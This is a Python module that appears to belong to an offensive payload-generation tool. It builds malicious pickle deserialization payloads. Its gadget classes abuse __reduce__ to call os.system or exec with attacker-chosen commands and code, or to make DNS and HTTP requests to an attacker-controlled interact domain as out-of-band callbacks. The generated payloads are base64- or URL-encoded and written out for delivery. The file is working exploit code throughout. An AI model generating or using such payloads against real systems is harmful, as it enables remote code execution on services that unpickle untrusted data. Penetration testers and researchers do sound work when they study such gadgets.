
import os
import logging
import urllib.parse
import base64
import importlib.util
import socket
import urllib.request
from .serializer import Serializer

class PickleSystemCommand:

    def __init__(self, cmd):
        self.cmd = (cmd)
        
    def __reduce__(self):
        return os.system, (self.cmd,)
    

class PickleCode:

    def __init__(self, code):
        self.code = code
        
    def __reduce__(self):
        pass
        return exec, (self.code,)
    
class PickleDNS:

    def __init__(self, hostname):
        self.hostname = hostname 

    def __reduce__(self):
        return socket.getaddrinfo, (self.hostname, 0,)
    
class PickleHttpGet:

    def __init__(self, url):
        self.url = url
        
    def __reduce__(self):
        return urllib.request.urlopen, (self.url,)
    
class Pickle(Serializer):

    gadgets = []

    def __init__(self, args):
        super().__init__('', args)
        self.gadgets.append({
            'id': 'picklesystemcommand',
            'name': 'PickleSystemCommand',
            'format': '<system_command>'
        })
        self.gadgets.append({
            'id': 'picklecode',
            'name': 'PickleCode',
            'format': '<code>'
        })
        self.gadgets.append({
            'id': 'pickledns',
            'name': 'PickleDNS',
            'format': '<domain>'
        })
        self.gadgets.append({
            'id': 'picklehttpget',
            'name': 'PickleHttpGet',
            'format': '<url>'
        })


    def exists(self):
        spam_spec = importlib.util.find_spec("pickle")
        if spam_spec is None:
            logging.error("pickle module does not exists")
            return False
        else:
            return True
        
    
    def chains(self):
        return self.gadgets

    def payload(self, chainName, chainArgs):
        import pickle
        if not chainName in globals():
            logging.error(f"[{chainName}] Undeclared class {chainName} in globals")
            return None
        
        className = globals()[chainName]
        logging.debug(f"[{chainName}] Dumping pickle byte code for object {className}(\"{chainArgs}\")")
        object = className(chainArgs)
        return pickle.dumps(object, protocol=pickle.HIGHEST_PROTOCOL)
    

    def generate(self, chains, output):

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        py_code = self.getFileContentOrCode(self.chainOpts.python_code)
    
        logging.info(f"System command: {system_command}")
        logging.info(f"Python Code: {py_code}")
        logging.info(f"Interact domain: {interact_domain}")

        logging.info(f"Generating payloads...")

        # generate payload for each chain
        count = 0
        for chain in chains:

            format = chain['format']

            if ('<url>' in format or '<domain>' in format) and not interact_domain:
                logging.warning(f"[{chain['name']}] Skipping payload with format {format} because it requires an interact domain")
                continue

            logging.info(f"[{chain['name']}] Generating payload")

            chain_system_command = system_command
            chain_system_command = chain_system_command.replace('%chain_id%', chain['id'])
            chain_system_command = chain_system_command.replace('%domain%', str(interact_domain))

            chain_py_code = py_code
            chain_py_code = chain_py_code.replace('%system_command%', chain_system_command)
            chain_py_code = chain_py_code.replace('%domain%', str(interact_domain))
            chain_py_code = chain_py_code.replace('%chain_id%', chain['id'])

            chainArguments = format
            chainArguments = chainArguments.replace('<system_command>', chain_system_command)
            chainArguments = chainArguments.replace('<code>', chain_py_code)
            chainArguments = chainArguments.replace('<domain>', str(interact_domain))
            chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")

            payload = self.payload(chain['name'], chainArguments)

            if payload is None:
                logging.error(f"[{chain['name']}] Failed to create payload")
                continue

            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            if self.chainOpts.base64:
                payload = base64.b64encode(payload)
            
            if self.chainOpts.url:
                payload = urllib.parse.quote_plus(payload).encode('ascii')
            
            output.write(payload+b"\n")
            count = count + 1
                
        return count